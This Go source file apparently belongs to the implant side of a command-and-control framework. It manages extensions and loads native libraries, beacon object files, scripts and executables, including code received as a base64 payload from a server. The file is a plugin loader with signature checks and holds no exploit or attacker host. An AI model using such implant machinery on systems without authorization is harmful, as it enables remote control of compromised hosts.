package extensions

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/r74tech/virga/internal/implant/logger"
)

// callbackLogger wraps ExtensionCallbacks to provide a logger interface
type callbackLogger struct {
	callbacks *ExtensionCallbacks
	fallback  *logger.Logger
}

func (l *callbackLogger) Debug(message string, fields map[string]interface{}) {
	if l.callbacks != nil && l.callbacks.Log != nil {
		l.callbacks.Log("debug", message, fields)
	} else if l.fallback != nil {
		l.fallback.Debug(message, fields)
	}
}

func (l *callbackLogger) Info(message string, fields map[string]interface{}) {
	if l.callbacks != nil && l.callbacks.Log != nil {
		l.callbacks.Log("info", message, fields)
	} else if l.fallback != nil {
		l.fallback.Info(message, fields)
	}
}

func (l *callbackLogger) Warn(message string, fields map[string]interface{}) {
	if l.callbacks != nil && l.callbacks.Log != nil {
		l.callbacks.Log("warn", message, fields)
	} else if l.fallback != nil {
		l.fallback.Warn(message, fields)
	}
}

func (l *callbackLogger) Error(message string, fields map[string]interface{}) {
	if l.callbacks != nil && l.callbacks.Log != nil {
		l.callbacks.Log("error", message, fields)
	} else if l.fallback != nil {
		l.fallback.Error(message, fields)
	}
}

// Manager manages the lifecycle of extensions
type Manager struct {
	mu          sync.RWMutex
	extensions  map[string]Extension
	loaders     map[ExtensionType]Loader
	callbacks   *ExtensionCallbacks
	log         *callbackLogger
	verifier    *Verifier            // Optional signature verifier
	limitConfig *ResourceLimitConfig // Optional resource limits
}

// Loader is the interface for loading different types of extensions
type Loader interface {
	// Load loads an extension from the given path
	Load(manifest *Manifest, path string) (Extension, error)

	// Unload unloads an extension
	Unload(extension Extension) error

	// GetType returns the type of extensions this loader handles
	GetType() ExtensionType
}

// NewManager creates a new extension manager
func NewManager(callbacks *ExtensionCallbacks) *Manager {
	m := &Manager{
		extensions: make(map[string]Extension),
		loaders:    make(map[ExtensionType]Loader),
		callbacks:  callbacks,
		log:        &callbackLogger{callbacks: callbacks, fallback: logger.Get()},
	}

	// Register default loaders
	m.RegisterLoader(NewNativeLoader())
	m.RegisterLoader(NewBOFLoader())
	m.RegisterLoader(NewScriptLoader())
	m.RegisterLoader(NewAliasLoader())

	return m
}

// RegisterLoader registers a new extension loader
func (m *Manager) RegisterLoader(loader Loader) {
	m.mu.Lock()
	defer m.mu.Unlock()

	m.loaders[loader.GetType()] = loader
}

// SetVerifier sets the signature verifier for the manager
func (m *Manager) SetVerifier(verifier *Verifier) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.verifier = verifier
}

// SetResourceLimits sets the resource limit configuration
func (m *Manager) SetResourceLimits(config *ResourceLimitConfig) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.limitConfig = config
}

// LoadExtension loads an extension from a directory or archive
func (m *Manager) LoadExtension(path string) error {
	m.log.Debug("Loading extension", map[string]interface{}{
		"path": path,
	})

	// Verify signature if verifier is set
	if m.verifier != nil {
		if err := m.verifier.VerifyExtension(path); err != nil {
			return &ExtensionError{
				Extension: filepath.Base(path),
				Stage:     "verify",
				Err:       fmt.Errorf("signature verification failed: %w", err),
			}
		}
		m.log.Info("Extension signature verified", map[string]interface{}{
			"path": path,
		})
	}

	// Load manifest
	manifest, err := m.loadManifest(path)
	if err != nil {
		return &ExtensionError{
			Extension: filepath.Base(path),
			Stage:     "load",
			Err:       fmt.Errorf("failed to load manifest: %w", err),
		}
	}

	// Check if already loaded
	if m.IsLoaded(manifest.Name) {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       fmt.Errorf("extension already loaded"),
		}
	}

	// Load dependencies first
	for _, dep := range manifest.DependsOn {
		if !m.IsLoaded(dep) {
			return &ExtensionError{
				Extension: manifest.Name,
				Stage:     "load",
				Err:       fmt.Errorf("missing dependency: %s", dep),
			}
		}
	}

	// Determine extension type from manifest
	extType := m.getExtensionTypeFromManifest(manifest)

	// Get the appropriate loader
	loader, exists := m.loaders[extType]
	if !exists {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       fmt.Errorf("no loader for extension type: %s", extType),
		}
	}

	// Handle different extension types
	var ext Extension
	var loadErr error

	if extType == ExtensionTypeAlias && manifest.Entrypoint != "" {
		// For alias extensions with entrypoint, use it directly
		ext, loadErr = loader.Load(manifest, manifest.Entrypoint)
	} else {
		// Find appropriate file for current platform
		extFile := m.findPlatformFile(manifest)
		if extFile == nil {
			return &ExtensionError{
				Extension: manifest.Name,
				Stage:     "load",
				Err:       fmt.Errorf("no compatible file for %s/%s", runtime.GOOS, runtime.GOARCH),
			}
		}

		// Load the extension
		fullPath := filepath.Join(path, extFile.Path)
		ext, loadErr = loader.Load(manifest, fullPath)
	}

	if loadErr != nil {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       loadErr,
		}
	}

	// Initialize the extension
	if err := ext.Initialize(m.callbacks); err != nil {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "init",
			Err:       err,
		}
	}

	// Register the extension
	m.mu.Lock()
	m.extensions[manifest.Name] = ext
	m.mu.Unlock()

	m.log.Info("Extension loaded", map[string]interface{}{
		"name":    manifest.Name,
		"version": manifest.Version,
		"type":    extType,
	})

	return nil
}

// LoadExtensionFromPayload loads an extension from server payload
func (m *Manager) LoadExtensionFromPayload(payload interface{}) error {
	m.log.Debug("Loading extension from payload", nil)

	// Parse the payload
	payloadMap, ok := payload.(map[string]interface{})
	if !ok {
		return fmt.Errorf("invalid payload type")
	}

	// Extract manifest JSON
	manifestJSON, ok := payloadMap["manifest"].(string)
	if !ok {
		return fmt.Errorf("manifest not found in payload")
	}

	// Extract binary data (can be []byte or base64 string)
	var data []byte
	if dataBytes, ok := payloadMap["data"].([]byte); ok {
		data = dataBytes
	} else if dataStr, ok := payloadMap["data"].(string); ok {
		// Try to decode from base64 if it's a string
		decoded, err := base64.StdEncoding.DecodeString(dataStr)
		if err != nil {
			return fmt.Errorf("failed to decode data from base64: %w", err)
		}
		data = decoded
	} else {
		return fmt.Errorf("data not found in payload or invalid type")
	}

	// Parse manifest
	var manifest Manifest
	if err := json.Unmarshal([]byte(manifestJSON), &manifest); err != nil {
		return fmt.Errorf("failed to parse manifest: %w", err)
	}

	// Check if already loaded
	if m.IsLoaded(manifest.Name) {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       fmt.Errorf("extension already loaded"),
		}
	}

	// Determine extension type from manifest
	extType := m.getExtensionTypeFromManifest(&manifest)

	// Get the appropriate loader
	loader, exists := m.loaders[extType]
	if !exists {
		// Fallback to in-memory extension if no loader found
		m.log.Warn("No loader found for extension type, using in-memory fallback", map[string]interface{}{
			"type": extType,
			"name": manifest.Name,
		})
		ext := &inMemoryExtension{
			manifest:  &manifest,
			data:      data,
			callbacks: m.callbacks,
		}

		// Initialize and register the extension
		if err := ext.Initialize(m.callbacks); err != nil {
			return &ExtensionError{
				Extension: manifest.Name,
				Stage:     "init",
				Err:       err,
			}
		}

		// Register the extension
		m.mu.Lock()
		m.extensions[manifest.Name] = ext
		m.mu.Unlock()

		m.log.Info("Extension loaded from payload (in-memory)", map[string]interface{}{
			"name":    manifest.Name,
			"version": manifest.Version,
		})

		return nil
	}

	// Create a temporary file for the extension data
	// Add appropriate file extension based on type
	fileExt := ""
	switch extType {
	case ExtensionTypeScript:
		// Default to Python for script type
		fileExt = ".py"
	case ExtensionTypeBOF:
		fileExt = ".o"
	case ExtensionTypeNative:
		switch runtime.GOOS {
		case "windows":
			fileExt = ".dll"
		case "darwin":
			fileExt = ".dylib"
		default:
			fileExt = ".so"
		}
	case ExtensionTypeAlias:
		if runtime.GOOS == "windows" {
			fileExt = ".exe"
		}
	}

	tempFile := filepath.Join(os.TempDir(), fmt.Sprintf("ext_%s_%d%s", manifest.Name, time.Now().UnixNano(), fileExt))
	if err := os.WriteFile(tempFile, data, 0o600); err != nil {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       fmt.Errorf("failed to write extension data: %w", err),
		}
	}
	defer os.Remove(tempFile)

	// Load the extension using the appropriate loader
	ext, err := loader.Load(&manifest, tempFile)
	if err != nil {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "load",
			Err:       err,
		}
	}

	// Initialize the extension
	if err := ext.Initialize(m.callbacks); err != nil {
		return &ExtensionError{
			Extension: manifest.Name,
			Stage:     "init",
			Err:       err,
		}
	}

	// Register the extension
	m.mu.Lock()
	m.extensions[manifest.Name] = ext
	m.mu.Unlock()

	m.log.Info("Extension loaded from payload", map[string]interface{}{
		"name":    manifest.Name,
		"version": manifest.Version,
	})

	return nil
}

// UnloadExtension unloads an extension
func (m *Manager) UnloadExtension(name string) error {
	m.mu.Lock()
	ext, exists := m.extensions[name]
	if !exists {
		m.mu.Unlock()
		return fmt.Errorf("extension not found: %s", name)
	}
	delete(m.extensions, name)
	m.mu.Unlock()

	// Cleanup the extension
	if err := ext.Cleanup(); err != nil {
		m.log.Error("Failed to cleanup extension", map[string]interface{}{
			"name":  name,
			"error": err.Error(),
		})
	}

	// Find the appropriate loader and unload
	manifest := ext.GetManifest()
	if manifest != nil && len(manifest.Files) > 0 {
		extFile := m.findPlatformFile(manifest)
		if extFile != nil {
			extType := m.getExtensionType(extFile.Path)
			if loader, exists := m.loaders[extType]; exists {
				if err := loader.Unload(ext); err != nil {
					m.log.Error("Failed to unload extension", map[string]interface{}{
						"name":  name,
						"error": err.Error(),
					})
				}
			}
		}
	}

	m.log.Info("Extension unloaded", map[string]interface{}{
		"name": name,
	})

	return nil
}

// ExecuteExtension executes an extension
func (m *Manager) ExecuteExtension(name string, args map[string]interface{}) (*ExtensionResult, error) {
	m.mu.RLock()
	ext, exists := m.extensions[name]
	limitConfig := m.limitConfig
	m.mu.RUnlock()

	if !exists {
		return nil, fmt.Errorf("extension not found: %s", name)
	}

	m.log.Debug("Executing extension", map[string]interface{}{
		"name": name,
		"args": args,
	})

	// Apply resource limits if configured
	var executor Extension = ext
	if limitConfig != nil {
		manifest := ext.GetManifest()
		if manifest != nil {
			limits := limitConfig.GetLimitsForExtension(manifest)
			executor = NewLimitedExtension(ext, limits)
			m.log.Debug("Applying resource limits", map[string]interface{}{
				"extension":   name,
				"max_memory":  limits.MaxMemoryMB,
				"max_cpu":     limits.MaxCPUPercent,
				"max_time":    limits.MaxExecutionTime,
				"max_threads": limits.MaxThreads,
			})
		}
	}

	result, err := executor.Execute(args)
	if err != nil {
		return nil, &ExtensionError{
			Extension: name,
			Stage:     "execute",
			Err:       err,
		}
	}

	return result, nil
}

// IsLoaded checks if an extension is loaded
func (m *Manager) IsLoaded(name string) bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	_, exists := m.extensions[name]
	return exists
}

// GetLoadedExtensions returns a list of loaded extensions
func (m *Manager) GetLoadedExtensions() []string {
	m.mu.RLock()
	defer m.mu.RUnlock()

	names := make([]string, 0, len(m.extensions))
	for name := range m.extensions {
		names = append(names, name)
	}
	return names
}

// GetExtension gets a loaded extension by name
func (m *Manager) GetExtension(name string) (Extension, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()

	ext, exists := m.extensions[name]
	return ext, exists
}

// loadManifest loads the extension manifest from a directory
func (m *Manager) loadManifest(path string) (*Manifest, error) {
	// Check for extension.json or alias.json
	manifestPaths := []string{
		filepath.Join(path, "extension.json"),
		filepath.Join(path, "alias.json"),
	}

	var manifestPath string
	for _, p := range manifestPaths {
		if _, err := os.Stat(p); err == nil {
			manifestPath = p
			break
		}
	}

	if manifestPath == "" {
		return nil, fmt.Errorf("no manifest file found")
	}

	data, err := os.ReadFile(manifestPath)
	if err != nil {
		return nil, err
	}

	var manifest Manifest
	if err := json.Unmarshal(data, &manifest); err != nil {
		return nil, err
	}

	return &manifest, nil
}

// findPlatformFile finds the appropriate file for the current platform
func (m *Manager) findPlatformFile(manifest *Manifest) *ExtensionFile {
	for _, file := range manifest.Files {
		if file.OS == runtime.GOOS && file.Arch == runtime.GOARCH {
			return &file
		}
	}
	return nil
}

// getExtensionType determines the extension type from file path
func (m *Manager) getExtensionType(path string) ExtensionType {
	ext := filepath.Ext(path)
	switch ext {
	case ".dll", ".so", ".dylib":
		return ExtensionTypeNative
	case ".o":
		return ExtensionTypeBOF
	case ".py", ".js", ".rb":
		return ExtensionTypeScript
	default:
		// Check if it's an executable (alias)
		if runtime.GOOS == "windows" && ext == ".exe" {
			return ExtensionTypeAlias
		}
		return ExtensionTypeAlias
	}
}

// getExtensionTypeFromManifest determines the extension type from manifest
func (m *Manager) getExtensionTypeFromManifest(manifest *Manifest) ExtensionType {
	// First check if type is explicitly specified in manifest
	if manifest.Type != "" {
		switch manifest.Type {
		case "native", "dll", "so", "dylib":
			return ExtensionTypeNative
		case "bof", "coff":
			return ExtensionTypeBOF
		case "script", "python", "javascript", "ruby":
			return ExtensionTypeScript
		case "alias", "command":
			return ExtensionTypeAlias
		}
	}

	// If not specified, try to determine from files
	if len(manifest.Files) > 0 {
		// Find the file for current platform
		for _, file := range manifest.Files {
			if file.OS == runtime.GOOS && file.Arch == runtime.GOARCH {
				return m.getExtensionType(file.Path)
			}
		}
		// If no exact match, use the first file
		if len(manifest.Files) > 0 {
			return m.getExtensionType(manifest.Files[0].Path)
		}
	}

	// Default to alias type
	return ExtensionTypeAlias
}

// inMemoryExtension is a simple extension implementation that stores data in memory
type inMemoryExtension struct {
	manifest  *Manifest
	data      []byte
	callbacks *ExtensionCallbacks
}

func (e *inMemoryExtension) GetManifest() *Manifest {
	return e.manifest
}

func (e *inMemoryExtension) Initialize(callbacks *ExtensionCallbacks) error {
	e.callbacks = callbacks
	if e.callbacks != nil && e.callbacks.Log != nil {
		e.callbacks.Log("info", fmt.Sprintf("Extension '%s' initialized", e.manifest.Name), nil)
	}
	return nil
}

func (e *inMemoryExtension) Execute(args map[string]interface{}) (*ExtensionResult, error) {
	// For now, just return a placeholder result
	// TODO: Implement actual execution based on extension type
	command := "default"
	if cmd, ok := args["command"].(string); ok {
		command = cmd
	}

	return &ExtensionResult{
		Success:   true,
		Output:    fmt.Sprintf("Extension '%s' executed command '%s' (in-memory mode)", e.manifest.Name, command),
		ExitCode:  0,
		Timestamp: time.Now(),
	}, nil
}

func (e *inMemoryExtension) Cleanup() error {
	if e.callbacks != nil && e.callbacks.Log != nil {
		e.callbacks.Log("info", fmt.Sprintf("Extension '%s' cleaned up", e.manifest.Name), nil)
	}
	return nil
}
